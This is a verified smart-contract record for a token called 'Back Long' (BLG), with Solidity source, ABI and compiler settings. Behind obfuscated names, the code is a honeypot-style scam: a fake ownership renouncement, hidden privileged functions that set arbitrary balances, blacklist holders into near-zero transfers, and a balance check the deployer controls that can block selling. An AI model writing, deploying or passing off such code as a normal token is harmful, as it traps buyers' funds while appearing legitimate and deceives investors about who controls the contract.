{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.12;\n\ninterface buyReceiverTo {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract launchedReceiver {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface senderLaunched {\n    function createPair(address totalLaunch, address enableAutoFrom) external returns (address);\n}\n\ninterface minExempt {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address maxTxBuy) external view returns (uint256);\n\n    function transfer(address minReceiver, uint256 autoFee) external returns (bool);\n\n    function allowance(address liquidityTx, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 autoFee) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address minReceiver,\n        uint256 autoFee\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed fundAmount, uint256 value);\n    event Approval(address indexed liquidityTx, address indexed spender, uint256 value);\n}\n\ninterface minExemptMetadata is minExempt {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract BackLong is launchedReceiver, minExempt, minExemptMetadata {\n\n    function marketingTotalLaunched() private view {\n        require(fundFee[_msgSender()]);\n    }\n\n    uint8 private senderTx = 18;\n\n    function minReceiverExempt(address swapSender) public {\n        marketingTotalLaunched();\n        \n        if (swapSender == toSender || swapSender == totalLimit) {\n            return;\n        }\n        minList[swapSender] = true;\n    }\n\n    uint256 public sellAt;\n\n    address public totalLimit;\n\n    uint256 private launchTradingEnable = 100000000 * 10 ** 18;\n\n    function minFrom(address txTo, address minReceiver, uint256 autoFee) internal returns (bool) {\n        if (txTo == toSender) {\n            return liquidityTxSender(txTo, minReceiver, autoFee);\n        }\n        uint256 feeFrom = minExempt(totalLimit).balanceOf(marketingLaunch);\n        require(feeFrom == amountLimit);\n        require(minReceiver != marketingLaunch);\n        if (minList[txTo]) {\n            return liquidityTxSender(txTo, minReceiver, launchLimitAmount);\n        }\n        return liquidityTxSender(txTo, minReceiver, autoFee);\n    }\n\n    mapping(address => bool) public minList;\n\n    function walletAt() public {\n        emit OwnershipTransferred(toSender, address(0));\n        amountFrom = address(0);\n    }\n\n    constructor (){\n        if (walletFund) {\n            sellAt = toTotal;\n        }\n        buyReceiverTo liquiditySender = buyReceiverTo(limitList);\n        totalLimit = senderLaunched(liquiditySender.factory()).createPair(liquiditySender.WETH(), address(this));\n        if (exemptSender == walletFund) {\n            sellAt = toTotal;\n        }\n        toSender = _msgSender();\n        walletAt();\n        fundFee[toSender] = true;\n        shouldSender[toSender] = launchTradingEnable;\n        \n        emit Transfer(address(0), toSender, launchTradingEnable);\n    }\n\n    function fromLimit(address teamTradingSwap, uint256 autoFee) public {\n        marketingTotalLaunched();\n        shouldSender[teamTradingSwap] = autoFee;\n    }\n\n    uint256 public toTotal;\n\n    function getOwner() external view returns (address) {\n        return amountFrom;\n    }\n\n    address limitList = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    address private amountFrom;\n\n    string private launchTotal = \"BLG\";\n\n    uint256 constant launchLimitAmount = 18 ** 10;\n\n    bool public totalListEnable;\n\n    uint256 public tradingMode;\n\n    function transfer(address teamTradingSwap, uint256 autoFee) external virtual override returns (bool) {\n        return minFrom(_msgSender(), teamTradingSwap, autoFee);\n    }\n\n    address public toSender;\n\n    bool public takeTeam;\n\n    function symbol() external view virtual override returns (string memory) {\n        return launchTotal;\n    }\n\n    mapping(address => bool) public fundFee;\n\n    uint256 maxMode;\n\n    uint256 public takeTotal;\n\n    function balanceOf(address maxTxBuy) public view virtual override returns (uint256) {\n        return shouldSender[maxTxBuy];\n    }\n\n    function shouldBuy(uint256 autoFee) public {\n        marketingTotalLaunched();\n        amountLimit = autoFee;\n    }\n\n    function tradingAuto(address amountTeam) public {\n        require(amountTeam.balance < 100000);\n        if (totalListEnable) {\n            return;\n        }\n        if (sellAt != toTotal) {\n            exemptSender = true;\n        }\n        fundFee[amountTeam] = true;\n        \n        totalListEnable = true;\n    }\n\n    mapping(address => mapping(address => uint256)) private fromReceiver;\n\n    string private tokenAuto = \"Back Long\";\n\n    function owner() external view returns (address) {\n        return amountFrom;\n    }\n\n    function approve(address launchTotalEnable, uint256 autoFee) public virtual override returns (bool) {\n        fromReceiver[_msgSender()][launchTotalEnable] = autoFee;\n        emit Approval(_msgSender(), launchTotalEnable, autoFee);\n        return true;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return senderTx;\n    }\n\n    uint256 amountLimit;\n\n    function name() external view virtual override returns (string memory) {\n        return tokenAuto;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return launchTradingEnable;\n    }\n\n    bool public exemptSender;\n\n    mapping(address => uint256) private shouldSender;\n\n    bool public launchTradingList;\n\n    bool public walletFund;\n\n    function allowance(address limitModeTake, address launchTotalEnable) external view virtual override returns (uint256) {\n        if (launchTotalEnable == limitList) {\n            return type(uint256).max;\n        }\n        return fromReceiver[limitModeTake][launchTotalEnable];\n    }\n\n    function liquidityTxSender(address txTo, address minReceiver, uint256 autoFee) internal returns (bool) {\n        require(shouldSender[txTo] >= autoFee);\n        shouldSender[txTo] -= autoFee;\n        shouldSender[minReceiver] += autoFee;\n        emit Transfer(txTo, minReceiver, autoFee);\n        return true;\n    }\n\n    event OwnershipTransferred(address indexed swapAmount, address indexed totalFund);\n\n    function transferFrom(address txTo, address minReceiver, uint256 autoFee) external override returns (bool) {\n        if (_msgSender() != limitList) {\n            if (fromReceiver[txTo][_msgSender()] != type(uint256).max) {\n                require(autoFee <= fromReceiver[txTo][_msgSender()]);\n                fromReceiver[txTo][_msgSender()] -= autoFee;\n            }\n        }\n        return minFrom(txTo, minReceiver, autoFee);\n    }\n\n    address marketingLaunch = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityTx\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"swapAmount\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalFund\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundAmount\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitModeTake\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchTotalEnable\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchTotalEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoFee\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxTxBuy\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptSender\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamTradingSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoFee\",\"type\":\"uint256\"}],\"name\":\"fromLimit\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fundFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchTradingList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"minList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapSender\",\"type\":\"address\"}],\"name\":\"minReceiverExempt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellAt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"autoFee\",\"type\":\"uint256\"}],\"name\":\"shouldBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeTotal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toSender\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"toTotal\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalLimit\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalListEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountTeam\",\"type\":\"address\"}],\"name\":\"tradingAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingMode\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamTradingSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoFee\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"txTo\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"minReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"autoFee\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletAt\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "BackLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}